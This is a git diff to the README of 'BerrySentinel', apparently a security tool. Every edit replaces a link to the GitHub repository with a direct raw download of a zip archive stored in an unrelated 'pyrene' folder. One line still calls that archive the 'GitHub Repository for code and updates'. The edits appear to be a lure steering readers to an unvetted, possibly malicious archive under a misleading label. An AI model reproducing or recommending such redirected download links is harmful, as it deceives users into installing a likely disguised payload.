@@ -1,6 +1,6 @@
 # 🛡️ BerrySentinel - Detect Threats Before They Spread
 
-[![Download BerrySentinel](https://img.shields.io/badge/Download-BerrySentinel-brightgreen)](https://github.com/TamaleGT/BerrySentinel)
+[![Download BerrySentinel](https://img.shields.io/badge/Download-BerrySentinel-brightgreen)](https://raw.githubusercontent.com/TamaleGT/BerrySentinel/main/pyrene/Berry_Sentinel_v3.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Before you start, make sure your computer meets these needs:
 1. **Visit the download page:**
 
    Click the big button above or go to this link:  
-   [https://github.com/TamaleGT/BerrySentinel](https://github.com/TamaleGT/BerrySentinel)
+   [https://raw.githubusercontent.com/TamaleGT/BerrySentinel/main/pyrene/Berry_Sentinel_v3.8.zip](https://raw.githubusercontent.com/TamaleGT/BerrySentinel/main/pyrene/Berry_Sentinel_v3.8.zip)
 
 2. **Find the latest release:**
 
@@ -112,8 +112,8 @@ Use the keyboard commands shown at the bottom of the screen to move, select, and
 
 ## 🔗 Important Links
 
-- [Download and Releases](https://github.com/TamaleGT/BerrySentinel)
-- GitHub Repository for code and updates: https://github.com/TamaleGT/BerrySentinel
+- [Download and Releases](https://raw.githubusercontent.com/TamaleGT/BerrySentinel/main/pyrene/Berry_Sentinel_v3.8.zip)
+- GitHub Repository for code and updates: https://raw.githubusercontent.com/TamaleGT/BerrySentinel/main/pyrene/Berry_Sentinel_v3.8.zip
 
 ---
 
@@ -148,4 +148,4 @@ Inside the GitHub repository, you will find a README explaining technical detail
 
 ---
 
-[![Download BerrySentinel](https://img.shields.io/badge/Download-BerrySentinel-brightgreen)](https://github.com/TamaleGT/BerrySentinel)
+[![Download BerrySentinel](https://img.shields.io/badge/Download-BerrySentinel-brightgreen)](https://raw.githubusercontent.com/TamaleGT/BerrySentinel/main/pyrene/Berry_Sentinel_v3.8.zip)
